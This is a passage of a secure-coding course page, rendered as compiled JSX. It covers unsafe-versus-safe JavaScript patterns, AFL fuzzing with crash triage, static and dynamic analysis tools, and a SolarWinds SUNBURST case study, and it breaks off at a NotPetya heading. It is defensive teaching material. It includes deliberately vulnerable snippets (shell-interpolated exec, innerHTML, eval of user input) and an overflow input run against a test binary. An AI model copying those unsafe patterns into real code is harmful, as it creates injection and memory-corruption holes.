        children: "public class SafeObjectInputStream extends ObjectInputStream {\n    private static final Set<String> ALLOWED = Set.of(\"com.app.User\", \"java.util.ArrayList\");\n\n    @Override\n    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {\n        if (!ALLOWED.contains(desc.getName())) {\n            throw new InvalidClassException(\"Unauthorized deserialization\", desc.getName());\n        }\n        return super.resolveClass(desc);\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "623-javascript-nodejs-and-browser",
      children: "6.2.3 JavaScript (Node.js and Browser)"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Practice"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Unsafe"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Safe"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Eval"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "eval(userInput)"
            })
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "JSON.parse()"
            }), " or safe expression parser"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "InnerHTML"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "elem.innerHTML = userInput"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "elem.textContent = userInput"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Command injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "exec('cat ' + filename)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use APIs that avoid shell"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Prototype pollution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "Object.assign(obj, userInput)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "JSON.parse(JSON.stringify(obj))"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "XSS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "res.send('<h1>' + userInput + '</h1>')"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Template escaping (EJS, React auto-escape)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example: Preventing command injection:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// UNSAFE\nconst { exec } = require('child_process');\nexec(`grep ${userInput} /var/log/app.log`, (err, stdout) => { ... });\n\n// SAFE\nconst { execFile } = require('child_process');\nexecFile('grep', [userInput, '/var/log/app.log'], { shell: false }, (err, stdout) => { ... });\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-7-fuzzing",
      children: "Section 7: Fuzzing"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "71-fuzzing-concepts",
      children: "7.1 Fuzzing Concepts"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Fuzzing is like a quality-control machine at a factory that shakes boxes of various sizes and weights to see which ones break. Instead of testing one expected scenario, it throws millions of random variations at the software."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Fuzzing types:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Black-box fuzzing:"
        }), " No knowledge of internals; random byte mutation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "White-box fuzzing:"
        }), " Full source + symbolic execution (SAGE, KLEE)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Grey-box fuzzing:"
        }), " Lightweight instrumentation for code coverage feedback (AFL, libFuzzer)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Coverage-guided fuzzing:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Start with seed inputs"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Mutate input (bit flips, arithmetic, splicing)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Run program with mutated input"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Measure code coverage (new paths discovered?)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If new coverage → add input to queue for further mutation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Repeat millions of times"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "72-practical-afl-american-fuzzy-lop",
      children: "7.2 Practical: AFL (American Fuzzy Lop)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "721-setup-and-basic-fuzzing",
      children: "7.2.1 Setup and Basic Fuzzing"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install AFL\nsudo apt-get install afl++ afl-clang\n\n# Take a vulnerable program and instrument it\nafl-gcc -o vuln_fuzz vuln.c\n\n# Create seed input directory\nmkdir -p fuzz_in fuzz_out\necho \"AAAA\" > fuzz_in/seed.txt\n\n# Run AFL fuzzer\nafl-fuzz -i fuzz_in -o fuzz_out -- ./vuln_fuzz\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "722-sample-afl-output",
      children: "7.2.2 Sample AFL Output"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "$ afl-fuzz -i fuzz_in -o fuzz_out -- ./vuln_fuzz @@\n                       american fuzzy lop ++4.08c (vuln_fuzz) [fast]\n\n+---------------------------------------+\n| process timing                        |\n|  run time : 0 days, 0 hrs, 2 min, 15 sec |\n|  last new path : 0 days, 0 hrs, 0 min, 3 sec |\n|  last uniq crash : 0 days, 0 hrs, 0 min, 5 sec |\n|  last uniq hang : 0 days, 0 hrs, 1 min, 33 sec |\n+---------------------------------------+\n| cycle progress                        |\n|  cycles done : 7                      |\n|  total paths : 124                    |\n|  uniq crashes : 3                     |\n|  uniq hangs : 1                       |\n+---------------------------------------+\n| map coverage                          |\n|  map density : 2.45% (1200/49152)     |\n|  count coverage : 1.03 bits/tuple     |\n+---------------------------------------+\n| findings in depth                     |\n|  favored paths : 16                   |\n|  new edges on : 18                    |\n|  total crashes : 47                   |\n|  total tmouts : 6                     |\n+---------------------------------------+\n| fuzzing strategy yields               |\n|  bit flips : 15/1240, 8/1240, 2/1240  |\n|  byte flips : 5/155, 2/155, 0/155     |\n|  arithmetics : 8/3250, 2/3250, 0/3250 |\n|  known ints : 3/325, 6/325, 1/325     |\n|  havoc : 9/5200, 23/5200              |\n|  splice : 2/480, 5/480                |\n+---------------------------------------+\n| crash probe                            |\n|  crash count: 3 (unique)              |\n|  test case: fuzz_out/default/crashes/id:000000*\n+---------------------------------------+\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "723-analyzing-a-crash",
      children: "7.2.3 Analyzing a Crash"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Reproduce crash with the minimized test case\n./vuln_fuzz fuzz_out/default/crashes/id:000000*\n\n# Triaging with GDB\ngdb -q --args ./vuln_fuzz fuzz_out/default/crashes/id:000000*\n(gdb) run\nProgram received signal SIGSEGV, Segmentation fault.\n0x08048427 in vulnerable ()\n(gdb) info registers eip\neip            0x51515151       0x51515151\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-8-static-and-dynamic-analysis",
      children: "Section 8: Static and Dynamic Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "81-static-analysis-sast",
      children: "8.1 Static Analysis (SAST)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Static analysis is like a food critic reviewing a recipe by reading it → they check ingredients, technique, and timing without actually cooking anything. Bugs found early in the recipe are cheaper to fix."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "811-flawfinder",
      children: "8.1.1 Flawfinder"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Scans C/C++ source code for potential security flaws:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install\npip install flawfinder\n\n# Scan a project\nflawfinder --html vuln.c > report.html\n\n# Scan with risk level filter\nflawfinder --minlevel 4 vuln.c\n\n# Output sample\n$ flawfinder vuln.c\nFlawfinder version 2.0.19\n(C) 2001-2022 David A. Wheeler\nNumber of rules (primarily dangerous function) used: 221\n\nExamining vuln.c\n\nvuln.c:9:  [4] (buffer) strcpy:\n  Does not check for buffer overflows when copying to buffer [MS-banned].\n  Consider using strncpy, strlcpy, or snprintf.\n  (CWE-120)\n\nAnalysis summary:\n  Hits = 1\n  Lines analyzed = 30 in 0.01 seconds (3000 lines/sec)\n  Physical Lines = 30\n  Hits@L5  = 0\n  Hits@L4  = 1\n  Hits@L3  = 0\n  Hits@L2  = 0\n  Hits@L1  = 0\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "812-rats-rough-auditing-tool-for-security",
      children: "8.1.2 RATS (Rough Auditing Tool for Security)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install\nsudo apt-get install rats\n\n# Scan\nrats vuln.c\n\n# Output\nEntries in perl: 0\nEntries in ruby: 0\nEntries in python: 0\nEntries in C: 2\n\nvuln.c:9: High: strcpy\n  strcpy() does not check for buffer overflows when copying.\n  Avoid strcpy() and use strncpy(), or better yet, snprintf().\n  See CWE-120, CWE-787\n\nvuln.c:9: Medium: fixed length local buffer\n  The buffer 'buffer' is declared as a local array of 64 bytes.\n  Using strcpy() with a statically-sized buffer can cause a buffer overflow.\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Risk Level Classification in SAST tools:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Level 5 (Critical):"
        }), " Memory corruption, command injection"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Level 4 (High):"
        }), " strcpy, sprintf without bounds, gets"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Level 3 (Medium):"
        }), " Race conditions, TOCTOU"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Level 2 (Low):"
        }), " Hardcoded paths, predictable random"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Level 1 (Info):"
        }), " Style issues, missing comments"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "82-dynamic-analysis-dast",
      children: "8.2 Dynamic Analysis (DAST)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Dynamic analysis is taste-testing the cooked meal → you find issues that only appear when the food is actually made (runtime config, memory states, race conditions)."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tools"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Finds"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Fuzzing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AFL, libFuzzer, OSS-Fuzz"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory corruption, crashes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Address Sanitizer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASan (GCC/Clang)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Buffer overflows, UAF"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Memory Sanitizer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MSan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Uninitialized memory reads"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Undefined Behavior Sanitizer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "UBSan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Undefined C/C++ behavior"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Coverage testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "gcov, lcov"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Untested code paths"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Binary instrumentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Valgrind, DynamoRIO"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory leaks, invalid accesses"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "AddressSanitizer example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "$ gcc -fsanitize=address -g -o vuln_asan vuln.c\n$ ./vuln_asan $(python2 -c 'print \"A\"*100')\n=================================================================\n==12345==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffd4f0\nWRITE of size 101 at 0xffffd4f0 thread T0\n    #0 0x8048456 in vulnerable vuln.c:9\n    #1 0x80484c2 in main vuln.c:16\n\nAddress 0xffffd4f0 is located in stack of thread T0\n  This frame has 1 object:\n    [32, 96) 'buffer' <== Memory access at offset 132 overflows this variable\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism\n      or swapcontext\n      (longjmp and custom std::longjmp handlers can crash on the stack)\nSUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "83-static-vs-dynamic-analysis-comparison",
      children: "8.3 Static vs Dynamic Analysis Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Dimension"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Static Analysis (SAST)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Dynamic Analysis (DAST)"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Phase"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Implementation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Testing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Code needed?"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (source or binary)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No (runs live application)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "False positives"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (many flagged issues are benign)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (observed real behavior)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "False negatives"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low for known patterns"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (only tests executed paths)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Speed"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fast (minutes for large codebases)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slow (hours to run comprehensive tests)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Coverage"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All code paths (theoretical)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only executed code paths"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Configuration"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot detect runtime-specific issues"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can detect runtime config issues"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Class of bugs"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Syntax flaws, logic errors, dangerous APIs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime errors, memory corruption, race conditions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Integration"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pre-commit hooks, CI pipeline"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CI/CD with staging environment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tools (C/C++)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Flawfinder, RATS, cppcheck, Coverity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASan, Valgrind, AFL, libFuzzer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tools (Java)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FindSecBugs, PMD, SonarQube"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP ZAP, Burp, JUnit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tools (Web)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ESLint security plugin, RetireJS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP ZAP, Burp Suite"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-9-case-studies",
      children: "Section 9: Case Studies"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "91-solarwinds-2020--supply-chain-attack",
      children: "9.1 SolarWinds (2020) → Supply Chain Attack"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A trusted package delivery company (SolarWinds) was compromised. Every box they delivered afterward contained a bug. Customers trusted the box because of the delivery company's reputation."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Type:"
      }), " Software supply chain attack"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Timeline:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Date"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Event"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jan 2019"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Initial compromise of SolarWinds build environment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Feb 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SUNBURST trojanized Orion DLL (SolarWinds.Orion.Core.BusinessLayer.dll) compiled"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mar 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trojanized update (Orion Platform 2020.2) released to 18,000 customers"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jun 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FireEye detects anomalous traffic from their own SolarWinds instance"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dec 8, 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FireEye publicly discloses breach and SUNBURST backdoor"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dec 13, 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Microsoft, SolarWinds, FireEye release joint analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dec 14, 2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CISA issues Emergency Directive 21-01"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Breakdown:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SUNBURST (trojanized Orion DLL):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["File: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "SolarWinds.Orion.Core.BusinessLayer.dll"
        })]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Added to legitimate SolarWinds digitally-signed installer"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "DGA-based C2: domain derived from system info and current time"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Dormant for 2 weeks after installation (anti-sandbox)"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["HTTP backdoor with configurable commands:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Execute command (via ", (0,jsx_runtime.jsx)(_components.code, {
              children: "cmd.exe /c"
            }), ")"]
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Read/write files"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Enumerate processes"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Disable itself"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Masked traffic as Orion Improvement Program (OIP) telemetry"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Exfiltrated data via ", (0,jsx_runtime.jsx)(_components.code, {
          children: "SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer"
        }), " fake telemetry"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SUPERNOVA (webshell):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Separate malware (not SUNBURST) → a C# webshell"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deployed via IIS application pool"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Imported as ", (0,jsx_runtime.jsx)(_components.code, {
          children: "app_web_*.dll"
        }), " (auto-compiled ASP.NET)"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Provided persistent HTTP backdoor"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Impact:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "18,000 organizations received trojanized update"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "~100 organizations compromised (secondary stage)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Victims: US Treasury, Commerce, Energy, DHS, DOJ, fireEye, Microsoft"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Estimated cost: $100M+ for response"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lessons:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Code signing ≠ trust"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Build environment must be zero-trust secured"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Software Bill of Materials (SBOM) visibility"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Network telemetry analysis for beaconing detection"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "92-notpetya-2017--ransomwarewiper",
      children: "9.2 NotPetya (2017) → Ransomware/Wiper"
